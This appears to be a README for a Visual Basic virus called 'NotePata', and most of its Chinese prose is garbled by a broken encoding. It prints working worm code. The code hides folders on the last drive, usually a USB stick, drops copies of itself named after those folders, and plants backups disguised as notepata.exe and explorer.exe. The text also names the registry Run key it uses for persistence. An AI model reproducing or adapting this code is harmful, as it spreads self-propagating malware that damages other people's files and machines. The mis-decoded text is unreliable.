# **NotePata - ����Visual Basic�Ĳ�����������**  
##### **������������Ϊ����������������ʵ��Σ���ԣ�����ʹ�������Σ�������ϵͳ�Ļ�����򲻵��������Σ�����Ų�����**  
**����Դ���ļ���У������[[���]](/shamd5.md "���")**
- ## ǰ����Ҫ
**2023��5�£�  
ѧУ�ĵ��Գ�����һ������. . .  
��������������Ĳ�����ͬ��  
����ľ���������������գ�  
������没�����񶾶����飬  
������������������թ�����޹����豸��  
ֻ����ҳ����£�����һ���������裬  
�ڵײ���������ܡ���Ծ��  
һ��֮�䣬�ò�������������ҡ�  
��֪�����ɺζ�����  
ֻ�ǣ�  
ͬѧУ�ദ�����һ���£�  
����һ���ر�Ĺ���. . .  **  
- ## �������
**������Ϊ����ѧУ�������޶�������һ���������ļ������������ `CFIT` �� `2023/7/1` ���д���ɡ�**
- ## ����ԭ��
- #####�ļ��и�Ⱦ
**�ļ��и�Ⱦ���������⺯��```ShowFileList()```ʵ�֡�
�����������£�**
```vb
Private Sub ShowFileList(folderspec) '�����Ⱦ����
On Error GoTo bbzlp0
Dim fs, f, f1, fc
If CreateObject("Scripting.FileSystemObject").DriveExists(folderspec) Then '�ж�ָ�����Ƿ����
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.getfolder(folderspec)
Set fc = f.SubFolders
For Each f1 In fc '��ɨ��ָ���̵������ļ���
Debug.Print folderspec + "\" + f1.Name + "\"
If f1.Name <> "System Volume Information" Then '�ų�"System Volume Information"�ļ���
SetAttr folderspec + "\" + f1.Name + "\", vbHidden '����ɨ����ļ���
If Dir(folderspec + "\" + f1.Name + ".exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", folderspec + "\" + f1.Name + ".exe" '�滻Ϊ�Ը�Ⱦ�ļ���Ϊ���Ƶ�Ӧ�ó�����ʵ���Ǹ��Ʋ������壩
End If
End If
If Dir("C:\Backups\", vbDirectory) = "" Then '����Notepata�����ļ���
fs.createfolder ("C:\Backups\")
End If
If Dir("D:\Setup\", vbDirectory) = "" Then '����explorer�����ļ���
fs.createfolder ("D:\Setup\")
End If
If Dir("C:\Backups\notepata.exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Backups\notepata.exe" '���屻ɾ�����ɴ˻ָ�
End If
If Dir("D:\Setup\explorer.exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "D:\Setup\explorer.exe" '����ɾ�����ɴ˻ָ�
End If
If App.EXEName <> "notepata" And App.EXEName <> "explorer" And Me.Enabled = True Then '��������£����Ǳ��弰������ִֻ���ļ��д򿪲���
Shell "explorer " + Chr(34) + folderspec + App.EXEName + Chr(34), vbNormalFocus '�򿪲������Ƶ��ļ���
Me.Enabled = False '����������Ϊ
Timer1.Enabled = False '����������Ϊ
Timer2.Enabled = False '����������Ϊ
Timer3.Enabled = False '����������Ϊ
Timer4.Enabled = False '����������Ϊ
Timer5.Enabled = False '����������Ϊ
Timer6.Enabled = False '����������Ϊ
End If
Next
Else
DoEvents
End If
bbzlp0:
If Err.Number > 0 Then
HandleErr '������
End If
End Sub
```
- #####����ԭ��
**�����ϴ��룬ͨ����ָ���̷������һ���̷������������ἰ���������ļ������أ��滻Ϊ���ļ������������Ĳ�������ͨ�����������һ����Ⱦ��  
ȷ�����һ���̷��������£�  **
```vb
'��ǰ��������ȴ���ʡ��
StrDrive = String(100, Chr$(0)) '��ʼ���̷���
Call GetLogicalDriveStrings(100, StrDrive) '�����̷���������ֵ��"C:\D:\E:\..."��
'...�м����ʡ��
DriveID = Split(StrDrive, Chr$(0)) '���ع����̷�������DeiveID�����ַ�����
For ii = 0 To UBound(DriveID)
If InStr(DriveID(ii), ":") <> 0 Then
av = av + 1
avail(av) = DriveID(ii)
End If
Next ii
S = avail(av) '�����ĩ�̷��������ƶ�Ӳ��ΪU�̣����Ⱦ��ΪU�̣�
ShowFileList S '����������Ⱦ���ĺ���
```
**����֮�⣬������ʵ�ּ��뿪�������ʹ��ע���ʵ�֡�  
ע����`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`**
**����������ڴ���������ڲ���ɾ����ָ��ȡ������Դ��ע������⡣**
- #####����ԭ��
������ʹ��ͼƬ��֡��֡ʵ�ֶ�ͼЧ����
��֡ͼƬ���£�
[![](https://cdn.jsdelivr.net/gh/CFITCorporation/cfitpic@a66715cf1fefc989390869a733b68df61c321c82/pic/2023/07/05/c9b0b75052bc2171ad6afa68cf9f2fe6.png)](./ "��֡ͼƬ")  

**ͬ����������ʵ�ֹ���������޲���6s��ʼ��ȹ��ܣ������Դ��ע������⡣**  
- ## ����
**������������`CFIT`����ʵ�֡�**
- ## ע��
**���������������ò�����Ҫ�������ԣ���˶Ա��ļ�ͷ��У�����������������Ը���**